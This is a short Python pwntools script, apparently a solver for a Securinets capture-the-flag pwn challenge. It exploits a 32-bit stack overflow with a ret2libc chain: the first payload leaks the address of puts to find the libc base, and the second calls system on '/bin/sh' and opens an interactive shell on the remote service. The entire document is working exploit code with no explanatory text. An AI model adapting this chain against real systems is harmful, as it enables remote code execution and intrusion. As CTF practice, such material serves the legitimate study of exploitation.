from pwn import *

context.binary = exe = ELF('./main')
libc = ELF('./libc.so.6')

io = remote('pwn.ctf.securinets.tn', 6666)
#gdb.attach(io, api=True)

ret = 0x080491d2
bin_sh = 0x1b5faa

io.recvuntil(b'?\n')
payload = p32(ret)*17 + p32(exe.plt['puts']) + p32(exe.sym['main']) + p32(exe.got['puts'])
io.sendline(payload)

libc.address = u32(io.recv(4)) - libc.sym['puts']
log.info(f'Libc base: {hex(libc.address)}')
io.recvuntil(b'?\n')
payload = p32(ret)*17 + p32(libc.sym['system']) + p32(exe.sym['main']) + p32(libc.address+bin_sh)
io.sendline(payload)

io.interactive()